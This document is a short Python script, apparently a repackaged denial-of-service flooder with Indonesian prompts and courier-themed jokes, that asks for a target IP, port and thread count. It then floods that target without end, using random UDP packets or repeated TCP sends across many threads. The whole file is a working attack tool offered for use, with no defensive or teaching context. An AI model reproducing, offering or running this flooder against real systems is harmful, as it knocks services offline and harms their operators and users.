#!/usr/bin/env python3
#Code by LeeOn123
import random
import socket
import threading

print("--> Edit By Benn <--")
print("#-- PAKET JNT --#")
ip = str(input(" IP Tujuan"))
port = int(input(" Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Berapa Paket Dikirimkan:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" [PAKET] OTW KE TEMPAT TUJUAN PAKET")
		except:
			print("[PAKET] TOK TOK TOK PAKETNYA DARI JNT NIH!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" [PAKET] OTW KE TEMPAT TUJUAN PAKET")
		except:
			s.close()
			print("[PAKET] TOK TOK TOK PAKETNYA DARI JNT NIH!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
